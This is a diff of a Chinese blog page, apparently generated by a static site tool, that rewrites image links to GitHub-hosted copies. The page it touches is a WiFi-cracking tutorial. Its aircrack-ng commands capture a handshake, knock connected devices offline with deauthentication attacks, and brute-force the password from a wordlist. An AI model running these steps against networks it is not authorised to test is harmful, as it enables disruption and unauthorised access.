@@ -7,8 +7,8 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/favicon.ico">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
+  <link rel="icon" href="https://raw.githubusercontent.com/gh0stNinja/images/main/favicon.ico">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
@@ -23,16 +23,16 @@
 <meta property="og:site_name" content="Ninja&#39;s blog">
 <meta property="og:description" content="0x01 命令12345678# 查看网卡信息iwconfig# 结束可能会影响网卡监听的进程airmon-ng check kill# 网卡设置为监听模式，完成后wlan0会变成wlan0monairmon-ng start wlan0# 探测附件WiFi信息airodump-ng wlan0mon   0x02 抓取连接时的数据包1234567airodump-ng wlan0mon -c 8">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png">
-<meta property="og:image" content="http://example.com/images/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg">
-<meta property="og:image" content="http://example.com/images/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png">
-<meta property="og:image" content="http://example.com/images/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png">
 <meta property="article:published_time" content="2019-11-28T07:17:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T07:42:22.333Z">
+<meta property="article:modified_time" content="2024-07-01T09:59:40.106Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="wifi">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -302,16 +302,16 @@
                 
                 <h4 id="0x01-命令"><a href="#0x01-命令" class="headerlink" title="0x01 命令"></a>0x01 命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网卡信息</span><br>iwconfig<br><span class="hljs-comment"># 结束可能会影响网卡监听的进程</span><br>airmon-ng check <span class="hljs-built_in">kill</span><br><span class="hljs-comment"># 网卡设置为监听模式，完成后wlan0会变成wlan0mon</span><br>airmon-ng start wlan0<br><span class="hljs-comment"># 探测附件WiFi信息</span><br>airodump-ng wlan0mon<br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x02-抓取连接时的数据包"><a href="#0x02-抓取连接时的数据包" class="headerlink" title="0x02 抓取连接时的数据包"></a>0x02 抓取连接时的数据包</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">airodump-ng wlan0mon -c 8 --bssid D4:**:**:**:**:E0 -w <span class="hljs-built_in">test</span><br><span class="hljs-comment"># 参数: </span><br>-c 		<span class="hljs-comment"># 指定信道 </span><br>--bssid <span class="hljs-comment"># 指定目标 </span><br>-w 		<span class="hljs-comment"># 保存 </span><br><span class="hljs-comment"># 如果有新的设备连接到此WiFi，就可以抓到包,标记处会出现信息，否则是空白的 </span><br><span class="hljs-comment"># 如果没有新的设备连接WiFi，就抓取不到数据。可以攻击已经连接的设备,强行使其掉线，再次连接WiFi</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x03-攻击目标，使其掉线重新连接"><a href="#0x03-攻击目标，使其掉线重新连接" class="headerlink" title="0x03 攻击目标，使其掉线重新连接"></a>0x03 攻击目标，使其掉线重新连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">aireplay-ng -0 10 -a D4:**:**:**:**:E0 wlan0mon -c 30:**:**:**:**:23  <br><span class="hljs-comment"># 参数:</span><br>-0 <span class="hljs-comment"># 指定次数， 0 则一直攻击</span><br>-a <span class="hljs-comment"># 指定WiFi-BSSID </span><br>-c <span class="hljs-comment"># 指定已连接WiFi的目标设备STATION，也可以不指定目标，攻击全部已经连接的设备</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h4 id="0x04-爆破WiFi密码"><a href="#0x04-爆破WiFi密码" class="headerlink" title="0x04 爆破WiFi密码"></a>0x04 爆破WiFi密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng -w password.txt test-01.cap <br><span class="hljs-comment"># 参数:</span><br>-w  <span class="hljs-comment"># 字典的路径</span><br>test-01.cap <span class="hljs-comment"># 抓取的数据包</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 
                 
               </div>
